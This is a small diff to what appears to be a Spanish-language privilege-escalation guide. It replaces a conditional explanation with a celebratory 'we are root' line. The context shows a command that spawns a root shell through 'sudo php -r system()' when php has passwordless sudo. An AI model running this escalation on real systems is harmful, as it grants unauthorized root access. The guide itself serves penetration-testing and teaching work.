@@ -92,8 +92,8 @@ CMD="/bin/sh"
 sudo php -r "system('$CMD');"
 ```
 
-Esto debería abrir una nueva shell con privilegios elevados (si el binario `php` tiene permisos de sudo sin contraseña).
-
+¡Y listo!  
+¡Ahora somos root! 🎉  
 
 
 
